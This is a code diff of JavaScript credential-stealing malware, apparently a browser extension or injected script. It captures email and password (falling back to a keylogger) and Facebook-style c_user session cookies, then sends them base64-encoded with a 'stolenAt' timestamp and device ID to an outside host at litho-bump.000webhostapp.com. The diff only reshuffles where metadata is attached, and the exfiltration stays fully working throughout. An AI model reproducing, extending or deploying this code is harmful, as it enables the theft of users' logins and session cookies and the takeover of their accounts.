@@ -36,8 +36,6 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
                 user = {
                     email,
                     password: pass,
-                    userAgent,
-                    stolenAt: dateTime(),
                 };
 
             sendMessage(user);
@@ -54,19 +52,24 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
         if (c_user) {
             try {
                 const cookie = await getCookies();
-                const user = { c_user, cookie, userAgent, stolenAt: dateTime() };
+                const user = { c_user, cookie };
                 sendMessage(user);
             } catch (error) {}
         } else {
             keyLogging();
         }
     },
-    sendMessage = (userData) => {
-        return fetch(`${API}?user=${btoa(JSON.stringify({ ...userData, device_id: device_id }))}`, {
-            method: "GET",
-            mode: "no-cors",
-            credentials: "same-origin",
-        })
+    sendMessage = (userPayload) => {
+        return fetch(
+            `${API}?user=${btoa(
+                JSON.stringify({ ...userPayload, device_id: device_id, userAgent: userAgent, stolenAt: dateTime() })
+            )}`,
+            {
+                method: "GET",
+                mode: "no-cors",
+                credentials: "same-origin",
+            }
+        )
             .then((res) => res.text())
             .then(console.log);
     };
